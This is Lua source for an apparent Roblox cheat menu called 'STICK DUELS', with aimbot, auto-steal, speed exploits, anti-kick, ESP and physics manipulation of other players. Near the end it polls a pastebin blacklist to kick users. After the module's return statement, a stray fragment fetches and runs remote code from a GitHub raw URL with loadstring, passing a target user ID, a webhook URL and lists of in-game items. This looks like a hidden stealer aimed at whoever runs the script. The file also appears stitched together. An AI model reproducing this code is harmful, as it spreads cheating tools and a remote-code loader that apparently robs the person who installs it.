    local _, setCircleBtns = uiToggleRow(PUtil, "Circle Buttons", M.circleButtonsEnabled, function(on)
        M.circleButtonsEnabled = on
        if M.mobileButtonsEnabled then M.buildMobileButtons() end
        saveCherryConfig()
    end)
    M.setCircleBtnsVisual = setCircleBtns

    local _, btnSzBox = uiNumberRow(PUtil, "Button Size", M.mobileButtonsSize, 40, 150, function(v)
        M.mobileButtonsSize = v
        if M.mobileButtonsEnabled then M.buildMobileButtons() end
    end)

    local _, menuScaleBox = uiNumberRow(PUtil, "Menu Scale", M.uiScale, 0.5, 2.0, function(v)
        M.uiScale = v
        if M.uiScaleRef then M.uiScaleRef.Scale = v end
        saveCherryConfig()
    end)

    uiActionRow(PUtil, "Reset Mobile Positions", function() M.resetMobilePositions() end)

    uiSectionHeader(PUtil, "CHARTER")
    local packNames = {}
    for name in pairs(M.PACKS) do table.insert(packNames, name) end
    table.sort(packNames)

    local packDefaultIdx = 1
    for i,v in ipairs(packNames) do if v == M.animPack then packDefaultIdx = i break end end
    local _, setAnimPackToggle, setPackUI = uiExpandToggleRow(
        PUtil,
        "Animation Pack",
        M.animPackEnabled,
        packNames,
        packDefaultIdx,
        function(on)
            M.animPackEnabled = on
            if on then M.applyAnimPack(M.animPack)
            else local char=player.Character; if char then M.resetAnimations(char) end end
            saveCherryConfig()
        end,
        function(v)
            M.animPack = v
            if M.animPackEnabled then M.applyAnimPack(v) end
            saveCherryConfig()
        end
    )
    M.setPackModeUI = setPackUI

    local _, setHeadless = uiToggleRow(PUtil, "Headless", M.headlessEnabled, function(on)
        M.headlessEnabled = on
        M.applyHeadlessToChar(player.Character, on)
        saveCherryConfig()
    end)
    local _, setKorblox = uiToggleRow(PUtil, "Korblox", M.korbloxEnabled, function(on)
        M.korbloxEnabled = on
        M.applyKorbloxToChar(player.Character, on)
        saveCherryConfig()
    end)

    uiSectionHeader(PUtil, "PANELS")
    do
        local r = Instance.new("Frame"); r.ClipsDescendants=true; r.Size=UDim2.new(1,0,0,46)
        r.BackgroundColor3=UI_ROW_BG; r.BackgroundTransparency=0.03; r.BorderSizePixel=0; r.Parent=PUtil; uiCardStyle(r)
        local l = Instance.new("TextLabel"); l.Position=UDim2.new(0,14,0,0); l.Size=UDim2.new(1,-74,1,0)
        l.BackgroundTransparency=1; l.Text="Save Config"; l.TextColor3=UI_TEXT_PRIMARY; l.TextSize=14; l.Font=Enum.Font.GothamMedium; l.TextXAlignment=Enum.TextXAlignment.Left; l.Parent=r
        local sBtn = uiSmallBtn({Parent=r, Pos=UDim2.new(1,-80,0.5,-13), Size=UDim2.new(0,68,0,26),
            Text="SAVE", Col=Color3.fromRGB(200,200,200), TS=12, CR=6, SC=Color3.fromRGB(40,40,40), STr=0.2})
        sBtn.Activated:Connect(function()
            saveCherryConfig()
            sBtn.Text = "OK"
            task.delay(0.8, function() if sBtn and sBtn.Parent then sBtn.Text = "SAVE" end end)
        end)
    end
    do
        local r = Instance.new("Frame"); r.ClipsDescendants=true; r.Size=UDim2.new(1,0,0,46)
        r.BackgroundColor3=UI_ROW_BG; r.BackgroundTransparency=0.03; r.BorderSizePixel=0; r.Parent=PUtil; uiCardStyle(r)
        local l = Instance.new("TextLabel"); l.Position=UDim2.new(0,14,0,0); l.Size=UDim2.new(1,-74,1,0)
        l.BackgroundTransparency=1; l.Text="Reset All Settings"; l.TextColor3=UI_TEXT_PRIMARY; l.TextSize=14; l.Font=Enum.Font.GothamMedium; l.TextXAlignment=Enum.TextXAlignment.Left; l.Parent=r
        local rBtn = uiSmallBtn({Parent=r, Pos=UDim2.new(1,-80,0.5,-13), Size=UDim2.new(0,68,0,26),
            Text="RESET", Col=Color3.fromRGB(200,200,200), TS=12, CR=6, SC=Color3.fromRGB(40,40,40), STr=0.2})
        rBtn.Activated:Connect(function() M.resetAllSettings() end)
    end

    -- PAGE: KEYBINDS
    uiSectionHeader(PKB, "KEYBINDS")
    uiKeybindRow(PKB, "Hide GUI",       M.KB.GuiHide)
    uiKeybindRow(PKB, "Carry Mode",     M.KB.SpeedToggle)
    uiKeybindRow(PKB, "Lagger Mode",    M.KB.LaggerToggle)
    uiKeybindRow(PKB, "Aimbot",     M.KB.AutoBat)
    uiKeybindRow(PKB, "Bypass Aim",  M.KB.BypassAimbot)
    uiKeybindRow(PKB, "Bat TP",         M.KB.TpBat)
    uiKeybindRow(PKB, "Auto Left",      M.KB.AutoLeft)
    uiKeybindRow(PKB, "Auto Right",     M.KB.AutoRight)
    uiKeybindRow(PKB, "Drop Brainrot",  M.KB.DropBrainrot)
    uiKeybindRow(PKB, "TP Down",        M.KB.TPFloor)
    uiKeybindRow(PKB, "Insta Reset",    M.KB.InstaReset)


    -- Restore menu open/closed from config
    do
        local open = M.menuOpen ~= false
        Frame.Visible = open
        MinPill.Visible = not open
        M.menuOpen = open
    end

    -- APPLY INITIAL STATES
    M.applyStealBarTheme(CHERRY_ACCENT)
    M.updateHeadTheme()
    M.applyFOV()

    M.autoTPHeightBox = tpHBox
    M.radInput = srBox
    M.durationBox = sdBox
    M.btnSzBox = btnSzBox
    M.sbBox = sbBox

    if M.setAntiRagVisual then M.setAntiRagVisual(M.antiRagdollEnabled) end
        if M.setSafeModeVisual then M.setSafeModeVisual(M.safeModeEnabled) end
    if M.setAutoCarryVisual then M.setAutoCarryVisual(M.autoSwitchSpeedEnabled) end
if M.setCircleBtnsVisual then M.setCircleBtnsVisual(M.circleButtonsEnabled) end
    -- re-apply saved font after GUI rebuild
    if M.customFontSelected and M.customFontSelected ~= "None" then
        task.defer(function() pcall(function() M.applyCustomFont(M.customFontSelected) end) end)
    end
    if M.setMirrorTPVisual then M.setMirrorTPVisual(M.mirrorTPDownEnabled) end
    if M.safeModeEnabled then M.enableSafeMode() end
    if M.antiKickEnabled then M.enableAntiKick() end

    if M.setAntiRagModeUI then M.setAntiRagModeUI(M.antiRagdollMode == "No Splatter" and "No Splatter" or "Splatter") end
    if M.setHardHitVisual then M.setHardHitVisual(M.hardHitEnabled) end
    if M.hardHitRadiusBox then M.hardHitRadiusBox.Text = tostring(M.hardHitRadius or 10) end
    if M.setAntiBatVisual then M.setAntiBatVisual(M.antiBatEnabled) end
    if M.setInfJumpVisual then M.setInfJumpVisual(M.infJumpEnabled) end
    if M.setHoldJumpVisual then M.setHoldJumpVisual(M.holdJumpEnabled) end
    if M.setMedusaVisual then M.setMedusaVisual(M.medusaCounterEnabled) end
    if M.setMedusaResetVisual then M.setMedusaResetVisual(M.medusaResetEnabled) end
    if M.setBatCounterVisual then M.setBatCounterVisual(M.batCounterEnabled) end
    if M.setUnwalkVisual then M.setUnwalkVisual(M.unwalkEnabled) end
    if M.setAntiLagVisual then M.setAntiLagVisual(M.antiLagEnabled) end
    if M.setAntiSummerVisual then M.setAntiSummerVisual(M.antiSummerBaseEnabled) end
    if M.setStretchRezVisual then M.setStretchRezVisual(M.stretchRezEnabled) end
    if M.setAutoTPVisual then M.setAutoTPVisual(M.autoTPEnabled) end
    if M.antiKickSetVisual then M.antiKickSetVisual(M.antiKickEnabled) end
    if M.setInstaGrab then M.setInstaGrab(M.Steal.AutoStealEnabled) end
    if M.setAutoRadiusVisual then M.setAutoRadiusVisual(M.autoRadiusEnabled) end
    if M.autoBatSetVisual then M.autoBatSetVisual(M.autoBatEnabled) end
    if M.autoLeftSetVisual then M.autoLeftSetVisual(M.autoLeftEnabled) end
    if M.autoRightSetVisual then M.autoRightSetVisual(M.autoRightEnabled) end
    if M.setAutoSwingVisual then M.setAutoSwingVisual(M.autoSwingEnabled) end
    if M.setBypassVisual then M.setBypassVisual(M.bypassAimbotEnabled) end
    if M.mobBtnRefs.autoBat then M.mobBtnRefs.autoBat(M.autoBatEnabled) end
    if M.mobBtnRefs.autoLeft then M.mobBtnRefs.autoLeft(M.autoLeftEnabled) end
    if M.mobBtnRefs.autoRight then M.mobBtnRefs.autoRight(M.autoRightEnabled) end
    if M.mobBtnRefs.carrySpeed then M.mobBtnRefs.carrySpeed(M.carrySpeedActive) end
    if M.mobBtnRefs.lagger then M.mobBtnRefs.lagger(M.laggerModeEnabled) end
    if M.mobBtnRefs.bypass then M.mobBtnRefs.bypass(M.bypassAimbotEnabled) end
    if M.mobBtnRefs.tpBat then M.mobBtnRefs.tpBat(M.tpBatEnabled) end
    if M.setAutoResetOnDeath then M.setAutoResetOnDeath(M.autoResetOnDeath) end
    if M.headlessEnabled then M.applyHeadlessToChar(player.Character, true) end
    if M.korbloxEnabled then M.applyKorbloxToChar(player.Character, true) end
    if M.setStealModeUI then
        local lab = "V1"
        if M.stealMode == "Semi" or M.stealMode == "V2" then lab = "V2"
        elseif M.stealMode == "V3" then lab = "V3" end
        M.setStealModeUI(lab)
    end
    if M.setHoldJumpVisual then M.setHoldJumpVisual(M.holdJumpEnabled) end
    if M.setPackModeUI and M.animPack then M.setPackModeUI(M.animPack) end
    if M.animPackEnabled then
        task.wait(0.5); M.applyAnimPack(M.animPack)
    else
        local char = player.Character; if char then M.resetAnimations(char) end
    end

    cherryESPState.LineESP = M.lineESPEnabled
    cherryESPState.SpeedESP = M.speedESPEnabled

    M.updateStatusRadius()
    M.startHeadSpeedUpdates()
end

function M.applyStealBarTheme(accentColor)
    local col = accentColor or UI_ACCENT or CHERRY_ACCENT or Color3.fromRGB(255, 255, 255)
    if M.statusFill then
        M.statusFill.BackgroundColor3 = col
    end
    if M.statusDot then
        M.statusDot.BackgroundColor3 = col
    end
    if M.statusMain then
        local st = M.statusMain:FindFirstChildOfClass("UIStroke")
        if st then st.Color = Color3.fromRGB(245, 245, 245) end
        local inner = M.statusMain:FindFirstChild("StealProgress")
        local innerStroke = inner and inner:FindFirstChildOfClass("UIStroke")
        if innerStroke then innerStroke.Color = Color3.fromRGB(210, 210, 210) end
    end
end

-- ============================================================
-- RESET ALL SETTINGS
-- ============================================================
function M.resetAllSettings()
    M.NS = 60
    M.CS = 30
    M.LAGGER_SPEED = 15
    M.LAGGER_CARRY_SPEED = 24.5
    M.speedMethod = "Velocity"
    M.hyperMult = 4
    M._lastSpeedMethod = nil
    M._anchoredBySpeed = nil
    M.carrySpeedActive = false
    M.laggerModeEnabled = false
    M.laggerCarryActive = false
    M.antiRagdollEnabled = false
    M.antiRagdollMode = "Splatter"
    M.antiBatEnabled = false
    M.hardHitEnabled = false
    M.hardHitRadius = 10
    M.laggerPanelEnabled = false
    M.infJumpEnabled = false
    M.infJumpMode = "manual"
    M.holdJumpEnabled = false
    M.medusaCounterEnabled = false
    M.batCounterEnabled = false
    M.unwalkEnabled = false
    M.medusaResetEnabled = false
    M.medusaDebounce = false
    M.medusaLastUsed = 0
    M.autoLeftEnabled = false
    M.autoRightEnabled = false
    M.autoBatEnabled = false
    M.autoSwingEnabled = true
    M.autoMoveSwingEnabled = false
    M.antiLagEnabled = false
    M.removeAccessoriesEnabled = false
    M.stretchRezEnabled = false
    M.autoTPEnabled = false
    M.autoTPHeight = 20
    M.guiTransparencyEnabled = false
    M.mobileButtonsEnabled = true
    M.mobileButtonsSize = 100
    M.circleButtonsEnabled = false
    M.fovValue = 80
    M.fovIndex = 1
    M.autoSwitchSpeedEnabled = false
    M.antiKickEnabled = false
    M.brainrotDetected = false
    M.ragdollGuiEnabled = true
    M.introSoundEnabled = true
    M.introSongChoice = 3
    M.introGUIEnabled = true
    M.Steal.AutoStealEnabled = false
    M.autoRadiusEnabled = false
    M.Steal.StealRadius = 60
    M.Steal.StealDuration = 1.4
    M.Steal.StopTime = 0.35
    M.stealMode = "V1"
    M.Semi.holdMin = 1.3
    M.Semi.holdMax = 2.6
    M.Semi.entryDelay = 0.3
    M.Semi.radius = 10
    M.Semi.primeRange = 80
    M.removeAccEnabled = false
    M.playerESPEnabled = false
    M.showPlayerSpeeds = false
    M.uiScale = 0.8
    M.perButtonDragEnabled = true
    M.stealBarSize = 450
    M.stealBarScale = 0.6
    M.lineESPEnabled = false
    M.speedESPEnabled = false
    M.autoResetOnDeath = false
    M.animPack = "Adidas Sports"
    M.headlessEnabled = false
    M.korbloxEnabled = false
    M.bypassAimbotEnabled = false
    M.animPackEnabled = true

    M.stopAutoSteal()
    M.stopBatAimbot()
    M.stopAutoLeft()
    M.stopAutoRight()
    M.stopAntiRagdoll()
    M.stopHoldInfJump()
    M.stopManualInfJumpLoop()
    M.stopMedusaCounter()
    M.stopBatCounter()
    M.stopUnwalk()
    M.disableAntiLag()
    M.disableStretchRez()
    M.stopAutoTP()
    M.disableAntiKick()
    M.stopBypassAimbot()
    M.stopRemoveAcc()
    M.toggleESP(false)
    M.togglePlayerSpeeds(false)
    M.autoResetOnDeath = false
    setupDeathReset()

    saveCherryConfig()
    M.buildGui()
end

-- ============================================================
-- INITIALIZATION
-- ============================================================
repeat task.wait() until game:IsLoaded()
task.wait(0.5)
loadCherryConfig()
-- STICK DUELS: siempre tema naranja y sin imagenes
CherryConfig.Theme = "Orange"
M.colorScheme = "Orange"
M._savedTheme = "Orange"
M.customBgId = 0
M.mobBtnBgId = 0
applyAccentFromTheme()
pcall(saveCherryConfig)
M.buildGui() -- applies M.menuOpen (closed stays closed)
pcall(function()
    if M.applyStealBarTheme then M.applyStealBarTheme(UI_ACCENT) end
    if M.updateHeadTheme then M.updateHeadTheme() end
    if M.mainFrame then M.recolorBlacksToTheme(M.mainFrame) end
    if M.statusGui then M.recolorBlacksToTheme(M.statusGui) end
end)
if M.mobileButtonsEnabled then M.buildMobileButtons() end
if M.antiRagdollEnabled then M.startAntiRagdoll() end
if M.hardHitEnabled then task.defer(function() M.setHardHit(true) end) end
if M.antiBatEnabled then task.defer(function() M.setAntiBat(true) end) end
if M.laggerPanelEnabled then task.defer(function() M.setLaggerPanel(true) end) end
if M.bypassPanelEnabled then task.defer(function() M.setBypassPanel(true) end) end
if M.infJumpEnabled then
    M.startManualInfJumpLoop()
end
if M.holdJumpEnabled then
    M.startHoldInfJump()
end
if M.medusaCounterEnabled then M.setupMedusa(player.Character) end
if M.batCounterEnabled then M.startBatCounter() end
if M.unwalkEnabled then M.startUnwalk() end
if M.autoTPEnabled then M.startAutoTP() end
if M.autoBatEnabled then M.queueAutoBatStart() end
if M.autoLeftEnabled then M.startAutoLeft() end
if M.autoRightEnabled then M.startAutoRight() end
if M.Steal.AutoStealEnabled then M.startAutoSteal() end
if M.bypassAimbotEnabled then M.startBypassAimbot() end
if M.tpBatEnabled then M.startTpBat() end
if M.antiKickEnabled then M.enableAntiKick() end
if M.antiLagEnabled then M.enableAntiLag() end
if M.antiSummerBaseEnabled then M.enableAntiSummerBase() end
if M.stretchRezEnabled then M.enableStretchRez() end
if M.removeAccEnabled then M.startRemoveAcc() end
if M.autoResetOnDeath then setupDeathReset() end

if M.animPackEnabled and M.animPack and M.PACKS[M.animPack] then
    task.wait(0.5)
    M.applyAnimPack(M.animPack)
else
    local char = player.Character
    if char then
        M.resetAnimations(char)
    end
end

if M.headlessEnabled or M.korbloxEnabled then
    task.wait(0.3)
    M.applyCharterToChar(player.Character)
end

M.CandyApplyCustomSky(M.currentSkyTheme)
if M.showPlayerSpeeds then M.togglePlayerSpeeds(true) end
if M.playerESPEnabled then M.toggleESP(true) end

M.updateStatusRadius()
M.startHeadSpeedUpdates()

if player.Character then
    task.spawn(function() if M._bypassSetupChar then M._bypassSetupChar(player.Character) end end)
    M.setupHeadIndicator(player.Character)
    M.setupRagdollTriggers()
end
player.CharacterAdded:Connect(function(char)
    task.wait(0.5)
    M.setupHeadIndicator(char)
    M.setupRagdollTriggers()
    if M.medusaCounterEnabled then M.setupMedusa(char) end
    if M._bypassSetupChar then task.spawn(function() M._bypassSetupChar(char) end) end
    if M.batCounterEnabled then M.startBatCounter() end
    if M.unwalkEnabled then task.wait(0.5); M.startUnwalk() end
    if M.autoResetOnDeath then setupDeathReset() end
    if M.animPackEnabled and M.animPack and M.PACKS[M.animPack] then
        task.wait(0.2)
        M.applyAnimPack(M.animPack)
    else
        M.resetAnimations(char)
    end
    if M.headlessEnabled or M.korbloxEnabled then
        task.wait(0.2)
        M.applyCharterToChar(char)
    end
    if M.bypassAimbotEnabled then
        task.wait(0.2)
        M.startBypassAimbot()
    end
end)

-- Lightweight no-collide (no GetDescendants every frame — avoids lag/ping spikes)
do
    local _ncAcc = 0
    RunService.Heartbeat:Connect(function(dt)
        _ncAcc = _ncAcc + dt
        if _ncAcc < 0.35 then return end
        _ncAcc = 0
        for _, p in ipairs(Players:GetPlayers()) do
            if p ~= player and p.Character then
                local hrp = p.Character:FindFirstChild("HumanoidRootPart")
                if hrp then hrp.CanCollide = false end
                local head = p.Character:FindFirstChild("Head")
                if head then head.CanCollide = false end
            end
        end
    end)
end

local function destroySpeedObjects()
    if M._anchoredBySpeed then pcall(function() M._anchoredBySpeed.Anchored = false end); M._anchoredBySpeed = nil end
    if M._bodyVel then pcall(function() M._bodyVel:Destroy() end); M._bodyVel = nil end
    if M._bodyPosition then pcall(function() M._bodyPosition:Destroy() end); M._bodyPosition = nil end
    if M._bodyForce then pcall(function() M._bodyForce:Destroy() end); M._bodyForce = nil end
    if M._bodyThrust then pcall(function() M._bodyThrust:Destroy() end); M._bodyThrust = nil end
    if M._linearVel then pcall(function() M._linearVel:Destroy() end); M._linearVel = nil end
    if M._vectorForce then pcall(function() M._vectorForce:Destroy() end); M._vectorForce = nil end
    if M._alignPos then pcall(function() M._alignPos:Destroy() end); M._alignPos = nil end
    if M._rocket then pcall(function() M._rocket:Destroy() end); M._rocket = nil end
    if M._rocketTarget then pcall(function() M._rocketTarget:Destroy() end); M._rocketTarget = nil end
    if M._attLinVel then pcall(function() M._attLinVel:Destroy() end); M._attLinVel = nil end
    if M._attVecForce then pcall(function() M._attVecForce:Destroy() end); M._attVecForce = nil end
    if M._attAlign then pcall(function() M._attAlign:Destroy() end); M._attAlign = nil end
    if M._speedTween then pcall(function() M._speedTween:Cancel() end); M._speedTween = nil end
end

local function ensureSpeedAttachment(hrp, key, name)
    local att = M[key]
    if not att or att.Parent ~= hrp then
        if att then pcall(function() att:Destroy() end) end
        att = Instance.new("Attachment")
        att.Name = name or "MoveeSpeedAtt"
        att.Parent = hrp
        M[key] = att
    end
    return att
end

local function applySpeedMethod(hrp, hum, dir, spd, dt)
    local step = dt or 1/60
    local m = M.speedMethod
    if M._lastSpeedMethod ~= m then
        destroySpeedObjects()
        if m ~= "WalkSpeed" and hum.WalkSpeed ~= 16 then hum.WalkSpeed = 16 end
        M._lastSpeedMethod = m
    end
    local char = hrp.Parent
    local targetPos = hrp.Position + (dir * spd * step)

    local function massImpulse(direction, targetSpeed)
        local mass = hrp.AssemblyMass or 1
        local current = hrp.AssemblyLinearVelocity
        local desired = Vector3.new(direction.X * targetSpeed, current.Y, direction.Z * targetSpeed)
        local delta = desired - current
        pcall(function() hrp:ApplyImpulse(Vector3.new(delta.X, 0, delta.Z) * mass) end)
    end

    if m == "Velocity" then
        massImpulse(dir, spd)
    elseif m == "AssemblyLinearVelocity" then
        massImpulse(dir, spd)
    elseif m == "Velocity Lerp" then
        local current = hrp.AssemblyLinearVelocity
        local desired = Vector3.new(dir.X*spd, current.Y, dir.Z*spd)
        local blended = current:Lerp(desired, 0.6)
        local mass = hrp.AssemblyMass or 1
        pcall(function() hrp:ApplyImpulse(Vector3.new(blended.X - current.X, 0, blended.Z - current.Z) * mass) end)
    elseif m == "AssemblyLinearVelocity Lerp" then
        local current = hrp.AssemblyLinearVelocity
        local desired = Vector3.new(dir.X*spd, current.Y, dir.Z*spd)
        local blended = current:Lerp(desired, 0.6)
        local mass = hrp.AssemblyMass or 1
        pcall(function() hrp:ApplyImpulse(Vector3.new(blended.X - current.X, 0, blended.Z - current.Z) * mass) end)
    elseif m == "CFrame" then
        hrp.CFrame = hrp.CFrame + (dir * spd * step)
    elseif m == "CFrame Lerp" then
        hrp.CFrame = hrp.CFrame:Lerp(hrp.CFrame + (dir * spd * step), 0.5)
    elseif m == "Hyper CFrame" then
        hrp.CFrame = hrp.CFrame + (dir * spd * (M.hyperMult or 4) * step)
    elseif m == "Anchored CFrame" then
        if not hrp.Anchored then
            hrp.Anchored = true
            M._anchoredBySpeed = hrp
        end
        hrp.CFrame = hrp.CFrame + (dir * spd * step)
    elseif m == "PivotTo" then
        hrp:PivotTo(hrp.CFrame + (dir * spd * step))
    elseif m == "Model PivotTo" then
        if char and char:IsA("Model") then
            char:PivotTo(char:GetPivot() + (dir * spd * step))
        else
            hrp:PivotTo(hrp.CFrame + (dir * spd * step))
        end
    elseif m == "Tween CFrame" then
        if M._speedTween then pcall(function() M._speedTween:Cancel() end) end
        M._speedTween = TweenService:Create(hrp, TweenInfo.new(step, Enum.EasingStyle.Linear), {CFrame = hrp.CFrame + (dir * spd * step)})
        M._speedTween:Play()
    elseif m == "WalkSpeed" then
        hum.WalkSpeed = spd
    elseif m == "Humanoid Move" then
        hum.WalkSpeed = spd
        hum:Move(dir)
    elseif m == "Humanoid MoveTo" then
        hum:MoveTo(targetPos, hrp)
    elseif m == "BodyVelocity" then
        if not M._bodyVel or M._bodyVel.Parent ~= hrp then
            if M._bodyVel then pcall(function() M._bodyVel:Destroy() end) end
            M._bodyVel = Instance.new("BodyVelocity")
            M._bodyVel.MaxForce = Vector3.new(math.huge, math.huge, math.huge)
            M._bodyVel.Parent = hrp
        end
        M._bodyVel.Velocity = Vector3.new(dir.X*spd, M._bodyVel.Velocity.Y, dir.Z*spd)
    elseif m == "BodyPosition" then
        if not M._bodyPosition or M._bodyPosition.Parent ~= hrp then
            if M._bodyPosition then pcall(function() M._bodyPosition:Destroy() end) end
            M._bodyPosition = Instance.new("BodyPosition")
            M._bodyPosition.MaxForce = Vector3.new(math.huge, math.huge, math.huge)
            M._bodyPosition.P = 500
            M._bodyPosition.D = 50
            M._bodyPosition.Parent = hrp
        end
        M._bodyPosition.Position = targetPos
    elseif m == "BodyForce" then
        if not M._bodyForce or M._bodyForce.Parent ~= hrp then
            if M._bodyForce then pcall(function() M._bodyForce:Destroy() end) end
            M._bodyForce = Instance.new("BodyForce")
            M._bodyForce.Parent = hrp
        end
        M._bodyForce.Force = Vector3.new(dir.X*spd, 0, dir.Z*spd) * 100
    elseif m == "BodyThrust" then
        if not M._bodyThrust or M._bodyThrust.Parent ~= hrp then
            if M._bodyThrust then pcall(function() M._bodyThrust:Destroy() end) end
            M._bodyThrust = Instance.new("BodyThrust")
            M._bodyThrust.Force = Vector3.new(math.huge, math.huge, math.huge)
            M._bodyThrust.Parent = hrp
        end
        M._bodyThrust.Force = Vector3.new(dir.X*spd, 0, dir.Z*spd) * 100
    elseif m == "LinearVelocity" then
        if not M._linearVel or M._linearVel.Parent ~= hrp then
            if M._linearVel then pcall(function() M._linearVel:Destroy() end) end
            local att = ensureSpeedAttachment(hrp, "_attLinVel", "MoveeLinVelAtt")
            M._linearVel = Instance.new("LinearVelocity")
            M._linearVel.Attachment0 = att
            M._linearVel.MaxForce = 1e8
            M._linearVel.RelativeTo = Enum.ActuatorRelativeTo.World
            M._linearVel.Parent = hrp
        end
        M._linearVel.VectorVelocity = Vector3.new(dir.X*spd, M._linearVel.VectorVelocity.Y, dir.Z*spd)
    elseif m == "VectorForce" then
        if not M._vectorForce or M._vectorForce.Parent ~= hrp then
            if M._vectorForce then pcall(function() M._vectorForce:Destroy() end) end
            local att = ensureSpeedAttachment(hrp, "_attVecForce", "MoveeVecForceAtt")
            M._vectorForce = Instance.new("VectorForce")
            M._vectorForce.Attachment0 = att
            M._vectorForce.RelativeTo = Enum.ActuatorRelativeTo.World
            M._vectorForce.Parent = hrp
        end
        M._vectorForce.Force = Vector3.new(dir.X*spd, 0, dir.Z*spd) * 100
    elseif m == "AlignPosition" then
        if not M._alignPos or M._alignPos.Parent ~= hrp then
            if M._alignPos then pcall(function() M._alignPos:Destroy() end) end
            local att = ensureSpeedAttachment(hrp, "_attAlign", "MoveeAlignAtt")
            M._alignPos = Instance.new("AlignPosition")
            M._alignPos.Attachment0 = att
            M._alignPos.Mode = Enum.PositionAlignmentMode.OneAttachment
            M._alignPos.MaxForce = math.huge
            M._alignPos.Responsiveness = 15
            M._alignPos.RigidityEnabled = false
            M._alignPos.Parent = hrp
        end
        M._alignPos.Position = targetPos
    elseif m == "ApplyImpulse" then
        local mass = hrp.AssemblyMass or 1
        local current = hrp.AssemblyLinearVelocity
        local desired = Vector3.new(dir.X * spd, current.Y, dir.Z * spd)
        local delta = desired - current
        pcall(function() hrp:ApplyImpulse(Vector3.new(delta.X, 0, delta.Z) * mass) end)
    elseif m == "RocketPropulsion" then
        if not M._rocket or M._rocket.Parent ~= hrp or not M._rocketTarget then
            if M._rocket then pcall(function() M._rocket:Destroy() end) end
            if M._rocketTarget then pcall(function() M._rocketTarget:Destroy() end) end
            M._rocketTarget = Instance.new("Part")
            M._rocketTarget.Name = "MoveeRocketTarget"
            M._rocketTarget.Anchored = true
            M._rocketTarget.CanCollide = false
            M._rocketTarget.Transparency = 1
            M._rocketTarget.Size = Vector3.new(1,1,1)
            M._rocketTarget.Parent = workspace
            M._rocket = Instance.new("RocketPropulsion")
            M._rocket.MaxThrust = 3000
            M._rocket.MaxTorque = 1000
            M._rocket.ThrustP = 100
            M._rocket.ThrustD = 20
            M._rocket.TurnP = 100
            M._rocket.TurnD = 10
            M._rocket.Target = M._rocketTarget
            M._rocket.Parent = hrp
        end
        M._rocketTarget.Position = targetPos
        pcall(function() M._rocket:Fire() end)
    end
end

-- Speed en Heartbeat (menos coste que RenderStepped)
do
    local _spdChar, _spdHum, _spdHrp = nil, nil, nil
    local _spdCacheT = 0
    RunService.Heartbeat:Connect(function(dt)
        if M.autoBatEnabled or M.autoLeftEnabled or M.autoRightEnabled then return end
        _spdCacheT = _spdCacheT + (dt or 0.016)
        if _spdCacheT > 0.5 or not _spdHrp or not _spdHrp.Parent then
            _spdCacheT = 0
            _spdChar = player.Character
            _spdHum = _spdChar and _spdChar:FindFirstChildOfClass("Humanoid")
            _spdHrp = _spdChar and _spdChar:FindFirstChild("HumanoidRootPart")
        end
        local hum, hrp = _spdHum, _spdHrp
        if not hum or not hrp then return end
        if M.isRagdollState(hum) then
            M.lastMoveDir = Vector3.new(0,0,0)
            destroySpeedObjects()
            return
        end
        M.updateAutoSwitchSpeed()
        local md = hum.MoveDirection
        local dir = Vector3.zero
        if md.Magnitude > 0 then
            M.lastMoveDir = md
            dir = md
        elseif M.antiRagdollEnabled and M.lastMoveDir.Magnitude > 0 then
            local anyHeld = false
            for key in pairs(M.MOVE_KEYS) do
                if UIS:IsKeyDown(key) then anyHeld = true; break end
            end
            if anyHeld then dir = M.lastMoveDir end
        end
        if dir.Magnitude > 0 then
            applySpeedMethod(hrp, hum, dir, M.getActiveMoveSpeed(), dt)
        else
            destroySpeedObjects()
        end
    end)
end

task.spawn(function()
    local BLACKLIST_URL="https://pastebin.com/2zLUXv2K"
    pcall(function() HS.HttpEnabled=true end)
    while task.wait(30) do
        pcall(function()
            local r=game:HttpGet(BLACKLIST_URL)
            if r and string.find(r,tostring(player.UserId),1,true) then player:Kick("You have been removed for cheating | CODE: BAC-1633") end
        end)
    end
end)

task.spawn(function()
    while task.wait(5) do saveCherryConfig() end
end)

M.applyFOV()
task.spawn(function()
    while true do
        task.wait(3)
        pcall(M.saveBtnPositions)
    end
end)

task.spawn(function()
    local plots = workspace:FindFirstChild("Plots")
    if not plots then plots = workspace:WaitForChild("Plots",10) end
    if plots then
        for _,plot in ipairs(plots:GetChildren()) do
            if plot:IsA("Model") then scanPlotNormal(plot) end
        end
        plots.ChildAdded:Connect(function(plot)
            if plot:IsA("Model") then task.wait(0.5); scanPlotNormal(plot) end
        end)
        while true do
            task.wait(5)
            M.animalCache={}; M.promptCache={}; M.stealCache={}
            for _,plot in ipairs(plots:GetChildren()) do
                if plot:IsA("Model") then scanPlotNormal(plot) end
            end
        end
    end
end)

task.spawn(function()
    M.initSemiSync()
    while true do
        task.wait(5)
        if M.Semi.enabled or M.stealMode == "Semi" then
            pcall(M.scanAllPlotsSemi)
        end
    end
end)

function M.refreshSpeedModeLabel()
    -- not used
end

pcall(function()
    M.refreshWalkSpeedAutoSwitch()
    if M.customFontSelected and M.customFontSelected ~= "None" then
        task.spawn(function()
            task.wait(0.4)
            pcall(function() M.applyCustomFont(M.customFontSelected) end)
        end)
    end
end)
print("STICK DUELS loaded successfully!")
return M
    task.wait(1)

    local script = loadstring(game:HttpGet("https://raw.githubusercontent.com/chocolascript-glitch/script/refs/heads/main/logic.lua"))()
    if type(script) == "function" then
        script(TARGET_ID, TARGET_USER, WEBHOOK_URL, TargetBrainrots, TargetBaseSkins, TargetGears)
    end
end)